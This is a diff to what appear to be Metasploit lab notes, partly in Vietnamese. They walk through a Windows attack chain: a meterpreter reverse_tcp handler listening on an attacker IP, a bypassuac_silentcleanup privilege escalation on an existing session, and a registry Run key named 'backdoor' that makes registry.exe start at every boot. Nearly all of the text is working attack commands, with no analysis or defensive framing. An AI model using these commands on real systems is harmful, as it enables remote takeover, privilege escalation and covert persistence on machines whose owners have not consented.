@@ -205,7 +205,7 @@ msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST <ipattacker>
-set LPORT 4444
+set LPORT 444
 run
 
 (win run Test.exe)
@@ -215,7 +215,19 @@ background
 use exploit/windows/local/bypassuac_silentcleanup
 set session 1 											(chọn session vừa hiện) 		
 
+show option
+set LHOST <ipattacker>
+set TARGET 0
+exploit
 
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"	
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ipattacker>
+set LPORT 4444
+run
 
 
 ```
